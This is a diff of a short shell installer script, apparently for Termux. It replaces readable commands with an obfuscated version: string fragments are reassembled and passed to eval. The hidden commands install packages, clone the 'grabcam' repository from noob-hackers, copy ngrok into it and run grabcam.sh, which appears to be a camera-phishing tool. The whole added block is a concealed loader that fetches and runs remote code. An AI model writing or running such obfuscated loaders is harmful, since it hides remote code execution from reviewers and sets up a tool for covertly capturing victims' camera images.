@@ -1,14 +1,3 @@
-apt-get update -y
-apt-get upgrade -y
-pkg install python -y
-pkg install python2 -y
-pkg install git -y
-pip install lolcat
-bash Vretlee.sh
-git clone https://github.com/noob-hackers/grabcam
-cd $HOME
-cp ngrok $HOME/CamPhish/grabcam
-ls
-cd grabcam
-ls
-bash grabcam.sh
+z="
+";pz='ish/';oz='amPh';Nz='on2 ';Ez='y';cz='/noo';kz='cp n';jz='HOME';mz=' $HO';Pz='pip ';Cz='upda';Xz='e ht';qz='grab';dz='b-ha';Uz='tlee';Iz='pkg ';rz='cam';vz='am';Yz='tps:';Oz='git ';bz='.com';hz='m';gz='abca';Gz='ade ';Hz='-y';Rz='at';tz='cd g';Az='apt-';az='thub';Tz=' Vre';xz='bcam';ez='cker';fz='s/gr';Fz='upgr';lz='grok';Kz='all ';nz='ME/C';uz='rabc';Zz='//gi';wz=' gra';Vz='.sh';Dz='te -';Qz='lolc';Sz='bash';sz='ls';iz='cd $';Wz='clon';Jz='inst';Lz='pyth';Bz='get ';Mz='on -';
+eval "$Az$Bz$Cz$Dz$Ez$z$Az$Bz$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$Ez$z$Iz$Jz$Kz$Lz$Nz$Hz$z$Iz$Jz$Kz$Oz$Hz$z$Pz$Jz$Kz$Qz$Rz$z$Sz$Tz$Uz$Vz$z$Oz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$z$iz$jz$z$kz$lz$mz$nz$oz$pz$qz$rz$z$sz$z$tz$uz$vz$z$sz$z$Sz$wz$xz$Vz"
